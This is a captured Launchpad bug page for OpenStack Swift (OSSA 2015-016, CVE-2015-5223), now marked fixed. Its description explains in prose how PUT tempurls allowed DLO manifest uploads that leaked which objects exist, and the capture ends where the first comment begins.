<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/swift/+bug/1453948/+index" />

    <meta charset="UTF-8" />
    <title>Bug #1453948 “[OSSA 2015-016] all PUT tempurls leak existence vi...” : Bugs : OpenStack Object Storage (swift)</title>
    <link rel="shortcut icon" href="/@@/launchpad.png" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/1453948" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/1453948/bug.atom" title="Bug 1453948 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/combo.css" />


    

    
      <meta name="description" content="If you get a PUT tempurl you can use DLO's to find objects in the container, or in the account.

If you are allowed to upload a DLO via PUT tempurl and the application that generated the tempurl believes it safe to generate a GET tempurl for the data they just authorized you to upload - they may accidentally authorize you to download any previously discovered data.

We should not allow uses to PUT DLO's via tempurl - it's currently insecure because of the existence leak attack; and can be dif..." />
      <meta property="og:description" content="If you get a PUT tempurl you can use DLO's to find objects in the container, or in the account.

If you are allowed to upload a DLO via PUT tempurl and the application that generated the tempurl believes it safe to generate a GET tempurl for the data they just authorized you to upload - they may accidentally authorize you to download any previously discovered data.

We should not allow uses to PUT DLO's via tempurl - it's currently insecure because of the existence leak attack; and can be dif..." />
    

    
    
      <meta property="og:title" content="Bug #1453948 “[OSSA 2015-016] all PUT tempurls leak existence vi...” : Bugs : OpenStack Object Storage (swift)" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/1453948" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?lp/',
                    comboBase: '/+combo/rev0d8de2bfee2024772b3040d4d19f42f47395ac0d/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["account-server", "consistency-engine", "container-server", "documentation", "ec-erasure-coding", "flakey-test", "i18n", "low-hanging-fruit", "middleware", "object-server", "ops", "proxy-server", "python3", "security", "test"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/swift/+bug/1453948/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/swift"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/52141984/os64.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/swift">OpenStack Object Storage (swift)</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/swift">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/swift">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/swift">Bugs</a></li>
      
      
    
    
      
      <li class="specifications"><a href="https://blueprints.launchpad.net/swift">Blueprints</a></li>
      
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/swift">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/swift">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    [OSSA 2015-016] all PUT tempurls leak existence via DLO manifest attack (CVE-2015-5223)
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #1453948 reported by
      <a href="https://launchpad.net/~clay-gerrard" class="sprite person">clayg</a>
      <time title="2015-05-11 20:25:31 UTC" datetime="2015-05-11T20:25:31.077753+00:00">on 2015-05-11</time>
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">264</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr class="highlight" id="tasksummary1840896">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/swift/+bug/1453948/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary1840896">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/swift">OpenStack Object Storage (swift)</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/swift/+bug/1453948/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/swift/+bug/1453948/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceCRITICAL">Critical</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary1840896">
          <span class="yui3-activator-data-box">
            
            
              Unassigned
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href="https://launchpad.net/swift/+milestone/2.4.0">OpenStack Object Storage (swift) 2.4.0</a>
        
      </div>
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task1840896">
     <td colspan="7"><form action="/swift/+bug/1453948/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/swift">OpenStack Object Storage (swift)</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~clay-gerrard" class="sprite person">clayg</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2015-05-11 20:25:31 UTC" datetime="2015-05-11T20:25:31.077753+00:00">2015-05-11</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2015-06-12 23:50:18 UTC" datetime="2015-06-12T23:50:18.156360+00:00">2015-06-12</time>
      </td>
    </tr>
    
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2015-08-27 10:26:31 UTC" datetime="2015-08-27T10:26:31.406076+00:00">2015-08-27</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2015-09-01 12:25:25 UTC" datetime="2015-09-01T12:25:25.093602+00:00">2015-09-01</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="swift.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" id="swift.target.option.package" name="swift.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="swift.target.distribution" name="swift.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="swift.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="swift.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="swift.target.package"
                         name="swift.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;swift.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('swift.target.package');
              var select_menu = Y.DOM.byId('swift.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-swift-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": null, "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionPackage", "input_element": "swift.target.package", "show_widget_id": "show-widget-swift-target-package", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
        var show_widget_id = 'show-widget-swift-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="swift.target.option.product" name="swift.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="swift" id="swift.target.product"
                         name="swift.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;swift.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('swift.target.product');
              var select_menu = Y.DOM.byId('swift.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-swift-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_team_text": "Remove team", "header": "Select a project", "show_remove_button": false, "selected_value": "swift", "step_title": "Search", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "Product", "input_element": "swift.target.product", "show_widget_id": "show-widget-swift-target-product", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
        var show_widget_id = 'show-widget-swift-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="swift.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="swift.importance">Importance</label>
        </td>
        <td>
          <label style="font-weight: bold" for="swift.milestone">Milestone</label>
        </td>
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="swift.status" name="swift.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="swift.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceCRITICAL">Critical</span>
        </td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          OpenStack Object Storage (swift) 2.4.0
        </td>
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="swift.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" checked="checked" id="swift.assignee.assign_to_nobody" name="swift.assignee.option" value="swift.assignee.assign_to_nobody" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="swift.assignee.assign_to_nobody">
          Nobody
        </label>
      </td>
    </tr>
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="swift.assignee.assign_to_me" name="swift.assignee.option" value="swift.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="swift.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="swift.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="swift.comment_on_change" name="swift.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
        
          
  <tr id="tasksummary1840975">
    <td>
      <a class="bugtask-expander" href="https://bugs.launchpad.net/ossa/+bug/1453948/+editstatus">
        &#8203;
      </a>
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary1840975">
        <span class="yui3-activator-data-box">
            <a class="sprite product" href="https://bugs.launchpad.net/ossa">OpenStack Security Advisory</a>
        </span>
        <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
          Edit
        </button>
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        
        
          <a href="https://bugs.launchpad.net/ossa/+bug/1453948/+editstatus" style="float: left" class="value statusFIXRELEASED">Fix Released</a>
          <a href="https://bugs.launchpad.net/ossa/+bug/1453948/+editstatus" style="margin-left: 3px">
            <img class="editicon" src="/@@/edit" />
          </a>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceMEDIUM">Medium</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary1840975">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~tristan-cacqueray">Tristan Cacqueray</a>
            
          </span>
          
          <button class="lazr-btn yui3-activator-act yui3-activator-hidden">
            Edit
          </button>
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  
    <tr class="bugtask-collapsible-content hidden" id="task1840975">
     <td colspan="7"><form action="/ossa/+bug/1453948/+editstatus" method="post" enctype="multipart/form-data">
  

  <p class="error message">
    You need to log in to change this bug's status.
  </p>
  
  <table class="summary" style="float: right; margin-left: 1em;">
    <tr>
      <th>Affecting:</th>
      <td><a href="/ossa">OpenStack Security Advisory</a></td>
    </tr>
    <tr>
      <th>Filed here by:</th>
      <td><a href="https://launchpad.net/~tristan-cacqueray" class="sprite person">Tristan Cacqueray</a></td>
    </tr>
    <tr>
      <th>When:</th>
      <td>
        <time title="2015-05-12 01:09:24 UTC" datetime="2015-05-12T01:09:24.024440+00:00">2015-05-12</time>
      </td>
    </tr>
    <tr>
      <th>Confirmed:</th>
      <td>
        <time title="2015-08-17 14:48:17 UTC" datetime="2015-08-17T14:48:17.468165+00:00">2015-08-17</time>
      </td>
    </tr>
    <tr>
      <th>Assigned:</th>
      <td>
        <time title="2015-08-17 14:48:19 UTC" datetime="2015-08-17T14:48:19.533287+00:00">2015-08-17</time>
      </td>
    </tr>
    <tr>
      <th>Started work:</th>
      <td>
        <time title="2015-08-19 20:29:04 UTC" datetime="2015-08-19T20:29:04.338091+00:00">2015-08-19</time>
      </td>
    </tr>
    <tr>
      <th>Completed:</th>
      <td>
        <time title="2015-09-08 12:15:29 UTC" datetime="2015-09-08T12:15:29.286545+00:00">2015-09-08</time>
      </td>
    </tr>
  </table>
  <div class="field">
    <table>
      <tr>
        <td>
          <label for="ossa.target">Target</label>
        </td>
      </tr>
      <tr>
        <td>
          <table>
  <tr>
    <td>
      <label>
        <input class="radioType" id="ossa.target.option.package" name="ossa.target" type="radio" value="package" />
        Distribution
      </label>
    </td>
    <td>
      <select id="ossa.target.distribution" name="ossa.target.distribution" size="1" >
<option value="baltix">Baltix</option>
<option value="boss">BOSS</option>
<option value="charms">Juju Charms Collection</option>
<option value="elbuntu">Elbuntu</option>
<option value="guadalinex">Guadalinex</option>
<option value="guadalinexedu">Guadalinex Edu</option>
<option value="kiwilinux">Kiwi Linux</option>
<option value="nubuntu">nUbuntu</option>
<option value="pld-linux">PLD Linux</option>
<option value="tilix">Tilix</option>
<option value="tuxlab">tuXlab</option>
<option selected="selected" value="ubuntu">Ubuntu</option>
<option value="ubuntu-leb">Ubuntu Linaro Evaluation Build</option>
<option value="ubuntu-rtm">Ubuntu RTM</option>
</select>
<input name="ossa.target.distribution-empty-marker" type="hidden" value="1" />
    </td>
  </tr>
  <tr>
    <td align="right">
      <label for="ossa.target.option.package">
        Package
      </label>
    </td>
    <td>
      


    <input type="text" value="" id="ossa.target.package"
                         name="ossa.target.package" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ossa.target.option.package&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ossa.target.package');
              var select_menu = Y.DOM.byId('ossa.target.package-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ossa-target-package" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_team_text": "Remove team", "header": "Select a package", "show_remove_button": false, "selected_value": null, "step_title": "Search by name", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "DistributionPackage", "input_element": "ossa.target.package", "show_widget_id": "show-widget-ossa-target-package", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
        var show_widget_id = 'show-widget-ossa-target-package';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>

  <tr>
    <td>
      <label>
        <input class="radioType" checked="checked" id="ossa.target.option.product" name="ossa.target" type="radio" value="product" />
       Project
      </label>
    </td>
    <td>
      


    <input type="text" value="ossa" id="ossa.target.product"
                         name="ossa.target.product" size="20"
                         maxlength=""
                         onKeyPress="selectWidget(&#x27;ossa.target.option.product&#x27;, event)" style=""
                         class="" />

    
      
      <script type="text/javascript">
          LPJS.use('node', 'lp.app.picker', function(Y) {
              var text_input = Y.DOM.byId('ossa.target.product');
              var select_menu = Y.DOM.byId('ossa.target.product-suggestions');
              Y.lp.app.picker.connect_select_menu(
                  select_menu, text_input);
          });</script>
    

    <span class="hidden">(<a id="show-widget-ossa-target-product" href="#">Find&hellip;</a>)</span>
    <script>
    LPJS.use('node', 'lp.app.picker', function(Y) {
        var config = {"remove_team_text": "Remove team", "header": "Select a project", "show_remove_button": false, "selected_value": "ossa", "step_title": "Search", "show_assign_me_button": false, "vocabulary_filters": [], "vocabulary_name": "Product", "input_element": "ossa.target.product", "show_widget_id": "show-widget-ossa-target-product", "assign_me_text": "Pick me", "show_create_team": false, "remove_person_text": "Remove person", "picker_type": "default", "extra_no_results_message": null, "selected_value_metadata": null};
        var show_widget_id = 'show-widget-ossa-target-product';
        Y.lp.app.picker.addPicker(config, show_widget_id);
    });
    </script>
  



    </td>
  </tr>
</table>

          
        </td>
      </tr>
    </table>
    
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ossa.status">Status</label>
        </td>
        <td>
          <label style="font-weight: bold" for="ossa.importance">Importance</label>
        </td>
        
      </tr>
      <tr>
        <td><div>
<div class="value">
<select id="ossa.status" name="ossa.status" size="1" >
<option selected="selected" value="Fix Released">Fix Released</option>
</select>
</div>
<input name="ossa.status-empty-marker" type="hidden" value="1" />
</div></td>
        <td title="Changeable only by a project maintainer or bug supervisor">
          <span class="sprite read-only"></span>
          <span class="importanceMEDIUM">Medium</span>
        </td>
        
      </tr>
    </table>
    <table>
      <tr>
        <td>
          <label style="font-weight: bold" for="ossa.assignee">Assigned to</label>
        </td>
      </tr>
      <tr>
        <td colspan="2" style="white-space: nowrap">

  <table>
    
    <tr>
      <td style="padding: 0 2px 2px 0">
        <input type="radio" id="ossa.assignee.assign_to_me" name="ossa.assignee.option" value="ossa.assignee.assign_to_me" />
      </td>
      <td style="padding: 0">
        <label style="font-weight: normal" for="ossa.assignee.assign_to_me">
          Me
        </label>
      </td>
    </tr>
    
      
        <tr>
          <td style="padding: 0 2px 2px 0">
              <input type="radio" checked="checked" id="ossa.assignee.assigned_to" name="ossa.assignee.option" value="ossa.assignee.assigned_to" />
          </td>
          <td style="padding: 0">
            <label style="font-weight: normal" for="ossa.assignee.assigned_to">
              Tristan Cacqueray (tristan-cacqueray)
            </label>
          </td>
        </tr>
      
    
    
  </table>


</td>
      </tr>
    </table>
    
  </div>
  <div class="field">
    <div>
      <label style="font-weight: bold" for="ossa.comment_on_change">Comment on this change (optional)</label>
      <textarea cols="62" rows="4" id="ossa.comment_on_change" name="ossa.comment_on_change"></textarea>
    </div>
    <div>
      <label style="font-weight: normal">
        <input type="checkbox" name="subscribe" id="subscribe" value="Subscribe" />
        Email me about changes to this bug report
      </label>
    </div>
  </div>
  
</form>
</td>
    </tr>
  


        
      </tbody>

    </table>



<div class="actions">
  
    <span id="also-affects-product" class="">
    <a class="menu-link-addupstream sprite add" href="https://bugs.launchpad.net/swift/+bug/1453948/+choose-affected-product">Also affects project</a>
        <a href="/+help-bugs/also-affects-project-help.html" target="help" class="sprite maybe action-icon">(?)</a>
    </span>
    <span id="also-affects-package" class="">
    <a class="menu-link-adddistro sprite add" href="https://bugs.launchpad.net/swift/+bug/1453948/+distrotask">Also affects distribution/package</a>
    </span>
    <a class="menu-link-nominate sprite milestone" href="https://bugs.launchpad.net/swift/+bug/1453948/+nominate">Nominate for series</a>
    
  

</div>




      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>If you get a PUT tempurl you can use DLO&#x27;s to find objects in the container, or in the account.</p>
<p>If you are allowed to upload a DLO via PUT tempurl and the application that generated the tempurl believes it safe to generate a GET tempurl for the data they just authorized you to upload - they may accidentally authorize you to download any previously discovered data.</p>
<p>We should not allow uses to PUT DLO&#x27;s via tempurl - it&#x27;s currently insecure because of the existence leak attack; and can be difficult to reason about safely for application authors generating tempurls.</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          <span>See <a href="comments/0">original description</a></span>
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            Tags:
          </span>
          <span id="tag-list">
            <a class="unofficial-tag" href="/swift/+bugs?field.tag=in-feature-crypto">in-feature-crypto</a>
            <a class="unofficial-tag" href="/swift/+bugs?field.tag=in-feature-hummingbird">in-feature-hummingbird</a>
            <a class="unofficial-tag" href="/swift/+bugs?field.tag=in-stable-juno">in-stable-juno</a>
            <a class="unofficial-tag" href="/swift/+bugs?field.tag=in-stable-kilo">in-stable-kilo</a>
          </span>
          
          <a href="+edit" title="Edit tags" id="tags-trigger" class="sprite edit action-icon">Edit</a>
          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2015-5223" title="OpenStack Object Storage (Swift) befo...">2015-5223</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/swift/+bug/1453948/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~clay-gerrard" class="sprite person">clayg (clay-gerrard)</a>
            wrote
